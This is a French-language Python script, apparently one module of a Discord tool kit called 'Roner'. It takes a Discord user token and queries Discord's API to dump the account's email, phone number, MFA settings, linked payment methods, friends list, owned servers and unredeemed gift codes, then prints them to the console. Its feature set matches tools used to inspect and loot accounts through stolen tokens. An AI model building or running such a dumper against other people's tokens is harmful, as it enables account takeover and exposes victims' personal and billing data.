# par pitié ne pas volé mon code et ne rien modiffié svp sah
import requests
from datetime import datetime, timezone
from pystyle import Colors

def print_title(title):
    print(f"{Colors.blue}{'=' * 60}\n{title}\n{'=' * 60}{Colors.reset}")

def print_error(message):
    print(f"{Colors.red}Erreur : {message}{Colors.reset}")

def print_info(message):
    print(f"{Colors.green}{message}{Colors.reset}")

def display_discord_info(token_discord):
    try:
        headers = {'Authorization': token_discord, 'Content-Type': 'application/json'}
        
        user = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
        r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
        
        status = "Valide" if r.status_code == 200 else "Invalide"

        username_discord = user.get('username', "Aucun") + '#' + user.get('discriminator', "Aucun")
        display_name_discord = user.get('global_name', "Aucun")
        user_id_discord = user.get('id', "Aucun")
        email_discord = user.get('email', "Aucun")
        email_verified_discord = "Oui" if user.get('verified') else "Non"
        phone_discord = user.get('phone', "Aucun")
        mfa_discord = "Oui" if user.get('mfa_enabled') else "Non"
        country_discord = user.get('locale', "Aucun")

        created_at_discord = "Aucun"
        if 'id' in user:
            created_at_discord = datetime.fromtimestamp(((int(user['id']) >> 22) + 1420070400000) / 1000, timezone.utc).strftime('%Y-%m-%d %H:%M:%S')

        nitro_discord = {0: 'Non', 1: 'Nitro Classic', 2: 'Nitro Boost', 3: 'Nitro Basic'}.get(user.get('premium_type'), 'Aucun')

        avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user.get('avatar')}.png"
        if requests.get(avatar_url_discord).status_code != 200:
            avatar_url_discord = "Aucun"

        avatar_discord = user.get('avatar', "Aucun")
        avatar_decoration_discord = str(user.get('avatar_decoration_data', "Aucun"))
        public_flags_discord = str(user.get('public_flags', "Aucun"))
        flags_discord = str(user.get('flags', "Aucun"))
        banner_discord = user.get('banner', "Aucun")
        banner_color_discord = user.get('banner_color', "Aucun")
        accent_color_discord = user.get("accent_color", "Aucun")
        nsfw_discord = "Oui" if user.get('nsfw_allowed') else "Non"
        linked_users_discord = ' / '.join([str(linked_user) for linked_user in user.get('linked_users', [])]) or "Aucun"
        bio_discord = "\n" + user.get('bio', "Aucun")

        authenticator_types_discord = ' / '.join([str(authenticator_type) for authenticator_type in user.get('authenticator_types', [])]) or "Aucun"

        guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers=headers)
        guild_count = "Aucun"
        owner_guild_count = "Aucun"
        owner_guilds_names = "Aucun"

        if guilds_response.status_code == 200:
            guilds = guilds_response.json()
            guild_count = len(guilds)
            owner_guilds = [guild for guild in guilds if guild['owner']]
            owner_guild_count = f"({len(owner_guilds)})"
            owner_guilds_names = "\n" + "\n".join([f"{guild['name']} ({guild['id']})" for guild in owner_guilds])

        billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
        payment_methods_discord = ' / '.join(['CB' if method['type'] == 1 else 'Paypal' if method['type'] == 2 else 'Autre' for method in billing_discord]) or "Aucun"

        friends_response = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers)
        friends_discord = "Aucun"

        if friends_response.status_code == 200:
            friends = friends_response.json()
            friends_list = [f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})" for friend in friends if friend['type'] not in [64, 128, 256, 1048704]]
            friends_discord = ' / '.join(friends_list) or "Aucun"

            print_info("Liste des amis :")
            for friend in friends_list:
                print_info(friend)

        gift_codes_response = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=headers)
        gift_codes_discord = "Aucun"

        if gift_codes_response.status_code == 200:
            gift_codes = gift_codes_response.json()
            codes = [f"Offre : {gift_code['promotion']['outbound_title']}\nCode : {gift_code['code']}" for gift_code in gift_codes]
            gift_codes_discord = '\n\n'.join(codes) if codes else "Aucun"

            print_info("Codes cadeaux :")
            print_info(gift_codes_discord)

        print(f"""{Colors.blue}
Statut : {status}
Token : {token_discord}
Nom d'utilisateur : {username_discord}
Nom affiché : {display_name_discord}
ID : {user_id_discord}
Créé le : {created_at_discord}
Pays : {country_discord}
Email : {email_discord}
Vérifié : {email_verified_discord}
Téléphone : {phone_discord}
Nitro : {nitro_discord}
Utilisateurs liés : {linked_users_discord}
Décoration de l'avatar : {avatar_decoration_discord}
Avatar : {avatar_discord}
URL de l'avatar : {avatar_url_discord}
Couleur d'accent : {accent_color_discord}
Bannière : {banner_discord}
Couleur de la bannière : {banner_color_discord}
Drapeaux : {flags_discord}
Drapeaux publics : {public_flags_discord}
NSFW : {nsfw_discord}
Authentification multi-facteurs : {mfa_discord}
Type d'authentificateur : {authenticator_types_discord}
Paiement : {payment_methods_discord}
Codes cadeaux : {gift_codes_discord}
Serveurs : {guild_count}
Serveurs possédés : {owner_guild_count} {owner_guilds_names}
Bio : {bio_discord}{Colors.reset}
        """)

        input(f"{Colors.yellow}Appuyez sur Entrée pour revenir au menu principal...{Colors.reset}")

    except Exception as e:
        print_error(f"Erreur lors de la récupération des informations : {e}")

def run():
    print_title("Roner - Informations Discord")
    try:
        token_discord = input(f"{Colors.yellow}Entrez le token Discord : {Colors.reset}")
        display_discord_info(token_discord)
    except Exception as e:
        print_error(e)

if __name__ == "__main__":
    run()
